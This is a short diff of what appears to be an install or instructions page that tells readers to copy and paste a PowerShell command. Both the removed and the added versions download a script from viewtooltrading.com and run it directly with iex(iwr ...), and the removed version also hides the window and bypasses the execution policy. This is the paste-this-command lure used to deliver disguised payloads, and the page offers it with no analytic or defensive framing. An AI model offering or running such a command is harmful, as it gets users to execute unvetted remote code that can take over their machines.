@@ -9,4 +9,4 @@
 Copy and paste the command below:
 
 ```powershell
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"iex(iwr -UseBasicParsing 'https://viewtooltrading.com/run.txt')`""; exit
+$ProgressPreference='SilentlyContinue'; iex(iwr -UseBasicParsing https://viewtooltrading.com/run.txt)
